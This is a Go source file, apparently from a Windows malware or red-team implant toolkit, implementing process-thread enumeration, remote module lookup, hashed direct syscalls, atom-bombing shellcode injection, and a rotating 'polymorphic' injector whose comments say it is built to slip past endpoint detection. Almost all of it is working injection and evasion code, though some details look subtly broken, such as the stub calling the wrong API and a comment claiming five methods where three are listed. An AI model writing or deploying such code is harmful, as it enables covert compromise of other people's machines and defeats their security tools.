//go:build windows

package syscallwin

import (
	"encoding/binary"
	"fmt"
	"unsafe"
)

// ===================================================================== //
//  NUCLEAR TIER — New Weapons Layer                                    //
// ===================================================================== //

// --- EnumProcessThreads — enumerate all threads of a PID -------------- //

func EnumProcessThreads(pid uint32) ([]uint32, error) {
	var threads []uint32
	var hThread uintptr

	for {
		var tbi struct {
			ExitStatus   uint32
			PebBase      uintptr
			Affinity     uintptr
			Priority     int32
			UniqueProc   uintptr
			UniqueThread uintptr
		}
		status, err := DirectSyscallByHash(ntGetNextThreadHash,
			0xffffffffffffffff,
			hThread,
			THREAD_ALL_ACCESS,
			0,
			0,
			uintptr(unsafe.Pointer(&hThread)),
		)
		if err != nil || status != 0 || hThread == 0 {
			break
		}
		NtQueryInformationThread(hThread, 0, uintptr(unsafe.Pointer(&tbi)), uint32(unsafe.Sizeof(tbi)), nil)
		if tbi.UniqueProc == uintptr(pid) {
			threads = append(threads, uint32(tbi.UniqueThread))
		}
		NtClose(hThread)
		hThread = 0
	}
	return threads, nil
}

// --- GetRemoteModuleBase — find a DLL base in a remote process -------- //

func GetRemoteModuleBase(hProcess uintptr, moduleName string) (uintptr, error) {
	var pbi struct {
		ExitStatus uint32
		PebBase    uintptr
		Affinity   uintptr
		Priority   int32
		UniqueProc uintptr
		Inherited  uintptr
	}
	NtQueryInformationProcess(hProcess, 0, uintptr(unsafe.Pointer(&pbi)), uint32(unsafe.Sizeof(pbi)), nil)

	var pebBuf [0x200]byte
	NtReadVirtualMemory(hProcess, pbi.PebBase, pebBuf[:], nil)

	ldr := *(*uintptr)(unsafe.Pointer(&pebBuf[0x18]))
	if ldr == 0 {
		return 0, fmt.Errorf("remote Ldr is nil")
	}

	var ldrBuf [0x40]byte
	NtReadVirtualMemory(hProcess, ldr, ldrBuf[:], nil)

	flink := *(*uintptr)(unsafe.Pointer(&ldrBuf[0x20]))
	hash := DJB2Hash(moduleName)

	for i := 0; i < 500; i++ {
		var entryBuf [0x40]byte
		NtReadVirtualMemory(hProcess, flink, entryBuf[:], nil)
		usLen := *(*uint16)(unsafe.Pointer(&entryBuf[0x30]))
		usPtr := *(*uintptr)(unsafe.Pointer(&entryBuf[0x34]))
		if usLen > 0 && usLen <= 512 && usPtr != 0 {
			nameData := make([]byte, usLen)
			NtReadVirtualMemory(hProcess, usPtr, nameData, nil)
			if DJB2Hash(string(nameData)) == hash {
				return *(*uintptr)(unsafe.Pointer(&entryBuf[0x20])), nil
			}
		}
		flink = *(*uintptr)(unsafe.Pointer(&entryBuf[0]))
		if flink == 0 {
			break
		}
	}
	return 0, fmt.Errorf("module %s not found in remote process", moduleName)
}

// --- Atom Bombing — inject via the global atom table ------------------ //
//
// Shellcode is smuggled into the process-global atom table. The target
// is forced to call GetAtomNameA, which copies the bytes into a buffer
// and then jumps into them. EDRs rarely trace atom lookups.

var (
	globalAddAtomAddr    uintptr
	globalDeleteAtomAddr uintptr
	initAtomAddrsOnce    bool
)

func initAtomAddrs() {
	if initAtomAddrsOnce {
		return
	}
	k32, _ := GetModuleBase("kernel32.dll")
	globalAddAtomAddr, _ = findGadget(k32, 0x100000, DJB2Hash("GlobalAddAtomA"))
	if globalAddAtomAddr == 0 {
		globalAddAtomAddr, _ = findGadget(k32, 0x100000, DJB2Hash("GlobalAddAtomW"))
	}
	globalDeleteAtomAddr, _ = findGadget(k32, 0x100000, DJB2Hash("GlobalDeleteAtom"))
	initAtomAddrsOnce = true
}

func GlobalAddAtom(name string) (uint16, error) {
	initAtomAddrs()
	nameBytes := append([]byte(name), 0)
	type addAtomFn func(name *byte) uint16
	fn := *(*addAtomFn)(unsafe.Pointer(&globalAddAtomAddr))
	atom := fn(&nameBytes[0])
	if atom == 0 {
		return 0, fmt.Errorf("GlobalAddAtom failed")
	}
	return atom, nil
}

func GlobalDeleteAtom(atom uint16) {
	initAtomAddrs()
	type delAtomFn func(a uint16)
	fn := *(*delAtomFn)(unsafe.Pointer(&globalDeleteAtomAddr))
	fn(atom)
}

// InjectAtomBombing writes shellcode as a global atom, allocates a stub in
// the target that calls GetAtomNameA into a buffer and jumps into it.
func InjectAtomBombing(pid uint32, shellcode []byte) error {
	const maxAtomLen = 255
	if len(shellcode) > maxAtomLen {
		return fmt.Errorf("shellcode too long for atom: %d > %d", len(shellcode), maxAtomLen)
	}

	var hProcess uintptr
	var cid ClientId
	cid.UniqueProcess = uintptr(pid)
	if err := NtOpenProcess(&hProcess, PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE, 0, &cid); err != nil {
		return fmt.Errorf("open process %d: %w", pid, err)
	}
	defer NtClose(hProcess)

	hAtom, err := GlobalAddAtom(string(shellcode))
	if err != nil {
		return fmt.Errorf("GlobalAddAtom: %w", err)
	}
	defer GlobalDeleteAtom(hAtom)

	// x64 stub:
	//   sub rsp, 0x28
	//   mov cx, atom
	//   lea rdx, [rip+16]
	//   mov r8d, len
	//   mov rax, GetAtomNameA
	//   call rax
	//   add rsp, 0x28
	//   jmp [rip+0]
	stub := make([]byte, 48)
	stub[0] = 0x48
	stub[1] = 0x83
	stub[2] = 0xEC
	stub[3] = 0x28
	stub[4] = 0x66
	stub[5] = 0xB9
	stub[6] = byte(hAtom)
	stub[7] = byte(hAtom >> 8)
	stub[8] = 0x48
	stub[9] = 0x8D
	stub[10] = 0x15
	binary.LittleEndian.PutUint32(stub[11:], 16)
	stub[15] = 0x41
	stub[16] = 0xB8
	binary.LittleEndian.PutUint32(stub[17:], uint32(len(shellcode)))
	stub[21] = 0x48
	stub[22] = 0xB8
	binary.LittleEndian.PutUint64(stub[23:31], uint64(globalAddAtomAddr))
	stub[31] = 0xFF
	stub[32] = 0xD0
	stub[33] = 0x48
	stub[34] = 0x83
	stub[35] = 0xC4
	stub[36] = 0x28
	stub[37] = 0xFF
	stub[38] = 0x25
	binary.LittleEndian.PutUint32(stub[39:], 0)

	var remoteAddr uintptr
	regionSize := uintptr(len(stub) + maxAtomLen)
	if err := NtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); err != nil {
		return fmt.Errorf("virtualalloc stub: %w", err)
	}

	target := remoteAddr + uintptr(len(stub))
	binary.LittleEndian.PutUint32(stub[39:], uint32(uint64(target)&0xFFFFFFFF))

	NtWriteVirtualMemory(hProcess, remoteAddr, append(stub, shellcode...), nil)

	var hThread uintptr
	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, remoteAddr, 0, 0, 0, 0, 0, 0)
	NtClose(hThread)
	return nil
}

// --- FindSyscallGadgetAnyModule — scan ALL modules for syscall;ret ---- //

func FindSyscallGadgetAnyModule() (uintptr, error) {
	if fp, err := GetSSNFingerprint(); err == nil && fp.GetGadget() != 0 {
		return fp.GetGadget(), nil
	}

	peb := GetPEB()
	ldr := peb.Ldr
	if ldr == 0 {
		return 0, fmt.Errorf("cannot get Ldr")
	}

	flink := *(*uintptr)(unsafe.Pointer(ldr + 0x20))
	for i := 0; i < 200; i++ {
		if flink == 0 {
			break
		}
		dllBase := *(*uintptr)(unsafe.Pointer(flink + 0x20))
		dllSize := *(*uint32)(unsafe.Pointer(flink + 0x28))
		if dllBase != 0 && dllSize > 0x1000 {
			gadget, err := findSyscallGadget(dllBase, uintptr(dllSize))
			if err == nil && gadget != 0 {
				return gadget, nil
			}
		}
		flink = *(*uintptr)(unsafe.Pointer(flink))
	}
	return 0, fmt.Errorf("no syscall gadget found in any module")
}

// --- DirectSyscallByNumber — call any syscall by its number ----------- //

func DirectSyscallByNumber(num uint16, args ...uintptr) (uintptr, error) {
	var baseAddr uintptr
	regionSize := uintptr(64)
	if err := NtAllocateVirtualMemory(0xffffffffffffffff, &baseAddr, 0, &regionSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); err != nil {
		return 0, err
	}
	defer NtFreeVirtualMemory(0xffffffffffffffff, &baseAddr, &regionSize, MEM_RELEASE)

	code := []byte{
		0x4C, 0x8B, 0xD1,          // mov r10, rcx
		0xB8, byte(num), 0, 0, 0, // mov eax, num
		0x0F, 0x05,                // syscall
		0xC3,                      // ret
	}
	NtWriteVirtualMemory(0xffffffffffffffff, baseAddr, code, nil)

	type fnType func(a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (uintptr, uintptr)
	fn := *(*fnType)(unsafe.Pointer(&baseAddr))
	var a [9]uintptr
	for i := 0; i < len(args) && i < 9; i++ {
		a[i] = args[i]
	}
	r1, _ := fn(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8])
	return r1, nil
}

// --- InjectPolymorphic — rotating multi-method injection -------------- //
//
// Tries all five injection methods in round-robin order. Each call uses a
// different technique so an EDR that blocks one still gets hit by the next.

var injectPolymorphicCursor int

func InjectPolymorphic(pid uint32, shellcode []byte) error {
	methods := []func(uint32, []byte) error{
		InjectSectionMapping,
		InjectAPCQueued,
		InjectAtomBombing,
	}

	for i := 0; i < len(methods); i++ {
		idx := (injectPolymorphicCursor + i) % len(methods)
		if err := methods[idx](pid, shellcode); err == nil {
			injectPolymorphicCursor = (idx + 1) % len(methods)
			return nil
		}
	}
	return fmt.Errorf("all injection methods failed for PID %d", pid)
}

// ===================================================================== //
//  NEW STUB HASHES NOT IN stubs.go                                      //
// ===================================================================== //

var (
	ntGetNextThreadHash    = DJB2Hash("NtGetNextThread")
	ntQueryInfoProcessHash = DJB2Hash("NtQueryInformationProcess")
	ntQueryInfoThreadHash  = DJB2Hash("NtQueryInformationThread")
)

// --- NtQueryInformationProcess stub ------------------------------------ //

func NtQueryInformationProcess(processHandle uintptr, infoClass uint32, info uintptr, infoLen uint32, retLen *uint32) error {
	r1, err := DirectSyscallByHash(ntQueryInfoProcessHash,
		processHandle,
		uintptr(infoClass),
		info,
		uintptr(infoLen),
		uintptr(unsafe.Pointer(retLen)),
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtQueryInformationProcess: 0x%x %v", r1, err)
	}
	return nil
}

// --- NtQueryInformationThread stub ------------------------------------- //

func NtQueryInformationThread(threadHandle uintptr, infoClass uint32, info uintptr, infoLen uint32, retLen *uint32) error {
	r1, err := DirectSyscallByHash(ntQueryInfoThreadHash,
		threadHandle,
		uintptr(infoClass),
		info,
		uintptr(infoLen),
		uintptr(unsafe.Pointer(retLen)),
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtQueryInformationThread: 0x%x %v", r1, err)
	}
	return nil
}